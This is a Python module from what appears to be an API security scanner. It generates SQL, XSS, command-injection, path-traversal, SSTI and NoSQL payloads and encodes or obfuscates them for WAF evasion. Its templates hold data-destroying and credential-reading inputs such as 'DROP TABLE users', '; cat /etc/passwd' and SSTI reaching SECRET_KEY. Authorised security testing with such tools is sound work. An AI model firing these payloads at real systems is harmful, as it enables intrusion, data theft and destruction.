"""
APILeak Payload Generator with Advanced Encoding and Obfuscation

This module provides comprehensive payload generation capabilities including:
- Multiple encoding types (URL, Base64, HTML, Unicode)
- Obfuscation techniques for WAF evasion
- Injection payload generation for various vulnerability types
- Template-based payload customization
- Wordlist transformations and expansions

Requirements: 16.1, 16.2, 16.3, 16.4, 16.5
"""

import base64
import html
import json
import random
import re
import string
import urllib.parse
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple, Union
from dataclasses import dataclass, field
from enum import Enum
import yaml

class EncodingType(Enum):
    """Supported encoding types for payload obfuscation"""
    URL = "url"
    BASE64 = "base64"
    HTML = "html"
    UNICODE = "unicode"
    DOUBLE_URL = "double_url"
    HEX = "hex"

class ObfuscationType(Enum):
    """Supported obfuscation techniques"""
    CASE_VARIATION = "case_variation"
    MUTATION = "mutation"
    WHITESPACE_INSERTION = "whitespace_insertion"
    COMMENT_INSERTION = "comment_insertion"
    CONCATENATION = "concatenation"

class VulnerabilityType(Enum):
    """Supported vulnerability types for payload generation"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    LDAP_INJECTION = "ldap_injection"
    XPATH_INJECTION = "xpath_injection"
    NOSQL_INJECTION = "nosql_injection"
    SSTI = "ssti"  # Server-Side Template Injection

@dataclass
class PayloadTemplate:
    """Template for generating vulnerability-specific payloads"""
    name: str
    vulnerability_type: VulnerabilityType
    base_payloads: List[str]
    variations: List[str] = field(default_factory=list)
    encodings: List[EncodingType] = field(default_factory=list)
    obfuscations: List[ObfuscationType] = field(default_factory=list)
    description: str = ""

@dataclass
class PayloadGenerationConfig:
    """Configuration for payload generation"""
    enabled_encodings: List[EncodingType] = field(default_factory=lambda: [
        EncodingType.URL, EncodingType.BASE64, EncodingType.HTML, EncodingType.UNICODE
    ])
    enabled_obfuscations: List[ObfuscationType] = field(default_factory=lambda: [
        ObfuscationType.CASE_VARIATION, ObfuscationType.MUTATION
    ])
    max_variations_per_payload: int = 10
    include_original: bool = True
    custom_templates_dir: Optional[str] = None

class PayloadGenerator:
    """
    Advanced payload generator with encoding and obfuscation capabilities
    
    Supports multiple encoding types, obfuscation techniques, and vulnerability-specific
    payload generation for comprehensive API security testing.
    """
    
    def __init__(self, config: PayloadGenerationConfig = None, templates_dir: str = None):
        """
        Initialize the payload generator
        
        Args:
            config: Configuration for payload generation
            templates_dir: Directory containing payload templates
        """
        self.config = config or PayloadGenerationConfig()
        self.templates_dir = templates_dir or "templates/payloads"
        self.templates: Dict[VulnerabilityType, List[PayloadTemplate]] = {}
        self._load_default_templates()
        if self.config.custom_templates_dir:
            self._load_custom_templates()
    
    def generate_encoded_payloads(self, base_payload: str, encodings: List[EncodingType] = None) -> List[str]:
        """
        Generate encoded variations of a base payload
        
        Args:
            base_payload: The original payload to encode
            encodings: List of encoding types to apply (uses config default if None)
            
        Returns:
            List of encoded payload variations
        """
        if encodings is None:
            encodings = self.config.enabled_encodings
        
        encoded_payloads = []
        
        if self.config.include_original:
            encoded_payloads.append(base_payload)
        
        for encoding in encodings:
            try:
                encoded = self._apply_encoding(base_payload, encoding)
                if encoded and encoded != base_payload:
                    encoded_payloads.append(encoded)
            except Exception as e:
                # Log encoding error but continue with other encodings
                continue
        
        # Generate combination encodings (e.g., URL + Base64)
        for i, enc1 in enumerate(encodings):
            for enc2 in encodings[i+1:]:
                try:
                    double_encoded = self._apply_encoding(
                        self._apply_encoding(base_payload, enc1), enc2
                    )
                    if double_encoded and double_encoded not in encoded_payloads:
                        encoded_payloads.append(double_encoded)
                except Exception:
                    continue
        
        return encoded_payloads
    
    def apply_obfuscation(self, payload: str, techniques: List[ObfuscationType] = None) -> List[str]:
        """
        Apply obfuscation techniques to a payload
        
        Args:
            payload: The payload to obfuscate
            techniques: List of obfuscation techniques to apply
            
        Returns:
            List of obfuscated payload variations
        """
        if techniques is None:
            techniques = self.config.enabled_obfuscations
        
        obfuscated_payloads = []
        
        if self.config.include_original:
            obfuscated_payloads.append(payload)
        
        for technique in techniques:
            variations = self._apply_obfuscation_technique(payload, technique)
            obfuscated_payloads.extend(variations)
        
        # Limit variations to prevent explosion
        if len(obfuscated_payloads) > self.config.max_variations_per_payload:
            obfuscated_payloads = obfuscated_payloads[:self.config.max_variations_per_payload]
        
        return list(set(obfuscated_payloads))  # Remove duplicates
    
    def generate_injection_payloads(self, vuln_type: VulnerabilityType) -> List[str]:
        """
        Generate payloads for specific vulnerability types
        
        Args:
            vuln_type: Type of vulnerability to generate payloads for
            
        Returns:
            List of vulnerability-specific payloads
        """
        if vuln_type not in self.templates:
            return []
        
        all_payloads = []
        
        for template in self.templates[vuln_type]:
            # Generate base payloads from template
            base_payloads = template.base_payloads.copy()
            
            # Add variations
            for base in template.base_payloads:
                for variation in template.variations:
                    base_payloads.append(base.replace("{VARIATION}", variation))
            
            # Apply encodings if specified in template
            if template.encodings:
                encoded_payloads = []
                for payload in base_payloads:
                    encoded_payloads.extend(
                        self.generate_encoded_payloads(payload, template.encodings)
                    )
                base_payloads.extend(encoded_payloads)
            
            # Apply obfuscations if specified in template
            if template.obfuscations:
                obfuscated_payloads = []
                for payload in base_payloads:
                    obfuscated_payloads.extend(
                        self.apply_obfuscation(payload, template.obfuscations)
                    )
                base_payloads.extend(obfuscated_payloads)
            
            all_payloads.extend(base_payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    def expand_wordlist(self, wordlist: List[str], prefixes: List[str] = None, 
                       suffixes: List[str] = None) -> List[str]:
        """
        Expand a wordlist with prefixes and suffixes
        
        Args:
            wordlist: Original wordlist
            prefixes: List of prefixes to add
            suffixes: List of suffixes to add
            
        Returns:
            Expanded wordlist with all combinations
        """
        expanded = wordlist.copy()
        
        if prefixes:
            for word in wordlist:
                for prefix in prefixes:
                    expanded.append(f"{prefix}{word}")
        
        if suffixes:
            for word in wordlist:
                for suffix in suffixes:
                    expanded.append(f"{word}{suffix}")
        
        # Generate prefix + word + suffix combinations
        if prefixes and suffixes:
            for word in wordlist:
                for prefix in prefixes:
                    for suffix in suffixes:
                        expanded.append(f"{prefix}{word}{suffix}")
        
        return list(set(expanded))  # Remove duplicates
    
    def generate_framework_specific_payloads(self, framework: str, vuln_type: VulnerabilityType) -> List[str]:
        """
        Generate payloads specific to a detected framework
        
        Args:
            framework: Detected framework (e.g., 'fastapi', 'django', 'express')
            vuln_type: Type of vulnerability to target
            
        Returns:
            Framework-specific payloads
        """
        framework_payloads = {
            'fastapi': {
                VulnerabilityType.SQL_INJECTION: [
                    "'; DROP TABLE users; --",
                    "' UNION SELECT * FROM information_schema.tables --",
                    "' OR '1'='1' --"
                ],
                VulnerabilityType.XSS: [
                    "<script>alert('FastAPI XSS')</script>",
                    "{{7*7}}",  # Template injection
                    "${7*7}"
                ]
            },
            'django': {
                VulnerabilityType.SQL_INJECTION: [
                    "'; DROP TABLE django_session; --",
                    "' UNION SELECT username, password FROM auth_user --"
                ],
                VulnerabilityType.SSTI: [
                    "{{settings.SECRET_KEY}}",
                    "{{request.META}}",
                    "{% load static %}{% static 'admin/css/base.css' %}"
                ]
            },
            'express': {
                VulnerabilityType.COMMAND_INJECTION: [
                    "; cat /etc/passwd",
                    "| whoami",
                    "&& ls -la"
                ],
                VulnerabilityType.XSS: [
                    "<script>alert('Express XSS')</script>",
                    "javascript:alert('XSS')"
                ]
            },
            'flask': {
                VulnerabilityType.SSTI: [
                    "{{config.items()}}",
                    "{{request.environ}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}"
                ],
                VulnerabilityType.XSS: [
                    "{{7*7}}",
                    "<script>alert('Flask XSS')</script>"
                ]
            }
        }
        
        framework_lower = framework.lower()
        if framework_lower in framework_payloads and vuln_type in framework_payloads[framework_lower]:
            base_payloads = framework_payloads[framework_lower][vuln_type]
            
            # Apply standard encoding and obfuscation
            all_payloads = []
            for payload in base_payloads:
                all_payloads.extend(self.generate_encoded_payloads(payload))
                all_payloads.extend(self.apply_obfuscation(payload))
            
            return list(set(all_payloads))
        
        return []
    
    def _apply_encoding(self, payload: str, encoding: EncodingType) -> str:
        """Apply specific encoding to a payload"""
        try:
            if encoding == EncodingType.URL:
                return urllib.parse.quote(payload, safe='')
            elif encoding == EncodingType.BASE64:
                return base64.b64encode(payload.encode()).decode()
            elif encoding == EncodingType.HTML:
                return html.escape(payload)
            elif encoding == EncodingType.UNICODE:
                return ''.join(f'\\u{ord(c):04x}' for c in payload)
            elif encoding == EncodingType.DOUBLE_URL:
                return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
            elif encoding == EncodingType.HEX:
                return ''.join(f'%{ord(c):02x}' for c in payload)
            else:
                return payload
        except Exception:
            return payload
    
    def _apply_obfuscation_technique(self, payload: str, technique: ObfuscationType) -> List[str]:
        """Apply specific obfuscation technique to a payload"""
        variations = []
        
        try:
            if technique == ObfuscationType.CASE_VARIATION:
                variations.extend(self._generate_case_variations(payload))
            elif technique == ObfuscationType.MUTATION:
                variations.extend(self._generate_mutations(payload))
            elif technique == ObfuscationType.WHITESPACE_INSERTION:
                variations.extend(self._insert_whitespace(payload))
            elif technique == ObfuscationType.COMMENT_INSERTION:
                variations.extend(self._insert_comments(payload))
            elif technique == ObfuscationType.CONCATENATION:
                variations.extend(self._generate_concatenations(payload))
        except Exception:
            pass
        
        return variations
    
    def _generate_case_variations(self, payload: str) -> List[str]:
        """Generate case variations of a payload"""
        variations = []
        
        # All uppercase
        variations.append(payload.upper())
        
        # All lowercase
        variations.append(payload.lower())
        
        # Random case
        random_case = ''.join(
            c.upper() if random.choice([True, False]) else c.lower()
            for c in payload
        )
        variations.append(random_case)
        
        # Alternating case
        alternating = ''.join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )
        variations.append(alternating)
        
        return variations
    
    def _generate_mutations(self, payload: str) -> List[str]:
        """Generate character mutations of a payload"""
        variations = []
        
        # Character substitutions for common SQL injection
        substitutions = {
            ' ': ['/**/', '+', '%20', '\t', '\n'],
            '=': ['LIKE', 'REGEXP', 'RLIKE'],
            'AND': ['&&', '%26%26'],
            'OR': ['||', '%7C%7C'],
            'UNION': ['UNION ALL', 'UNION DISTINCT'],
            'SELECT': ['SELECT/**/'],
            "'": ['%27', '"', '`']
        }
        
        for original, replacements in substitutions.items():
            if original in payload:
                for replacement in replacements:
                    variations.append(payload.replace(original, replacement))
        
        return variations
    
    def _insert_whitespace(self, payload: str) -> List[str]:
        """Insert whitespace characters for obfuscation"""
        variations = []
        whitespace_chars = [' ', '\t', '\n', '\r', '\f', '\v']
        
        # Insert random whitespace
        for ws in whitespace_chars:
            # Insert at random positions
            for _ in range(3):  # Generate 3 variations per whitespace type
                pos = random.randint(0, len(payload))
                variation = payload[:pos] + ws + payload[pos:]
                variations.append(variation)
        
        return variations
    
    def _insert_comments(self, payload: str) -> List[str]:
        """Insert SQL/code comments for obfuscation"""
        variations = []
        comments = ['/**/', '/*comment*/', '--', '#', '-- -']
        
        for comment in comments:
            # Insert at word boundaries
            words = payload.split()
            if len(words) > 1:
                for i in range(1, len(words)):
                    new_words = words.copy()
                    new_words.insert(i, comment)
                    variations.append(' '.join(new_words))
        
        return variations
    
    def _generate_concatenations(self, payload: str) -> List[str]:
        """Generate string concatenation variations"""
        variations = []
        
        # SQL concatenation
        if len(payload) > 4:
            mid = len(payload) // 2
            sql_concat = f"'{payload[:mid]}'||'{payload[mid:]}'"
            variations.append(sql_concat)
            
            # MySQL CONCAT
            mysql_concat = f"CONCAT('{payload[:mid]}','{payload[mid:]}')"
            variations.append(mysql_concat)
        
        return variations
    
    def _load_default_templates(self):
        """Load default payload templates"""
        # SQL Injection templates
        self.templates[VulnerabilityType.SQL_INJECTION] = [
            PayloadTemplate(
                name="Basic SQL Injection",
                vulnerability_type=VulnerabilityType.SQL_INJECTION,
                base_payloads=[
                    "' OR '1'='1",
                    "' OR 1=1 --",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT 1,2,3 --",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
                ],
                variations=["admin", "test", "1", "true"],
                encodings=[EncodingType.URL, EncodingType.UNICODE],
                obfuscations=[ObfuscationType.CASE_VARIATION, ObfuscationType.MUTATION]
            )
        ]
        
        # XSS templates
        self.templates[VulnerabilityType.XSS] = [
            PayloadTemplate(
                name="Basic XSS",
                vulnerability_type=VulnerabilityType.XSS,
                base_payloads=[
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<svg onload=alert('XSS')>",
                    "';alert('XSS');//"
                ],
                encodings=[EncodingType.URL, EncodingType.HTML, EncodingType.UNICODE],
                obfuscations=[ObfuscationType.CASE_VARIATION]
            )
        ]
        
        # Command Injection templates
        self.templates[VulnerabilityType.COMMAND_INJECTION] = [
            PayloadTemplate(
                name="Basic Command Injection",
                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                base_payloads=[
                    "; cat /etc/passwd",
                    "| whoami",
                    "&& ls -la",
                    "`id`",
                    "$(whoami)",
                    "; ping -c 4 127.0.0.1"
                ],
                encodings=[EncodingType.URL],
                obfuscations=[ObfuscationType.WHITESPACE_INSERTION]
            )
        ]
        
        # Path Traversal templates
        self.templates[VulnerabilityType.PATH_TRAVERSAL] = [
            PayloadTemplate(
                name="Basic Path Traversal",
                vulnerability_type=VulnerabilityType.PATH_TRAVERSAL,
                base_payloads=[
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd"
                ],
                encodings=[EncodingType.URL, EncodingType.DOUBLE_URL],
                obfuscations=[ObfuscationType.MUTATION]
            )
        ]
        
        # SSTI templates
        self.templates[VulnerabilityType.SSTI] = [
            PayloadTemplate(
                name="Server-Side Template Injection",
                vulnerability_type=VulnerabilityType.SSTI,
                base_payloads=[
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}",
                    "{{config.items()}}",
                    "{{request.environ}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}"
                ],
                encodings=[EncodingType.URL],
                obfuscations=[ObfuscationType.CASE_VARIATION]
            )
        ]
        
        # NoSQL Injection templates
        self.templates[VulnerabilityType.NOSQL_INJECTION] = [
            PayloadTemplate(
                name="NoSQL Injection",
                vulnerability_type=VulnerabilityType.NOSQL_INJECTION,
                base_payloads=[
                    "'; return true; var x='",
                    "' || '1'=='1",
                    "'; return this.username == 'admin' && this.password == 'admin'; var x='",
                    "'; return db.users.find(); var x='",
                    "'; return db.users.drop(); var x='"
                ],
                encodings=[EncodingType.URL],
                obfuscations=[ObfuscationType.MUTATION]
            )
        ]
    
    def _load_custom_templates(self):
        """Load custom payload templates from YAML files"""
        if not self.config.custom_templates_dir:
            return
        
        templates_path = Path(self.config.custom_templates_dir)
        if not templates_path.exists():
            return
        
        for template_file in templates_path.glob("*.yaml"):
            try:
                with open(template_file, 'r') as f:
                    template_data = yaml.safe_load(f)
                
                vuln_type = VulnerabilityType(template_data['vulnerability_type'])
                template = PayloadTemplate(
                    name=template_data['name'],
                    vulnerability_type=vuln_type,
                    base_payloads=template_data['base_payloads'],
                    variations=template_data.get('variations', []),
                    encodings=[EncodingType(e) for e in template_data.get('encodings', [])],
                    obfuscations=[ObfuscationType(o) for o in template_data.get('obfuscations', [])],
                    description=template_data.get('description', '')
                )
                
                if vuln_type not in self.templates:
                    self.templates[vuln_type] = []
                self.templates[vuln_type].append(template)
                
            except Exception as e:
                # Log error but continue loading other templates
                continue
    
    def get_available_vulnerability_types(self) -> List[VulnerabilityType]:
        """Get list of available vulnerability types"""
        return list(self.templates.keys())
    
    def get_template_info(self, vuln_type: VulnerabilityType) -> List[Dict[str, str]]:
        """Get information about templates for a vulnerability type"""
        if vuln_type not in self.templates:
            return []
        
        return [
            {
                'name': template.name,
                'description': template.description,
                'payload_count': len(template.base_payloads),
                'encodings': [e.value for e in template.encodings],
                'obfuscations': [o.value for o in template.obfuscations]
            }
            for template in self.templates[vuln_type]
        ]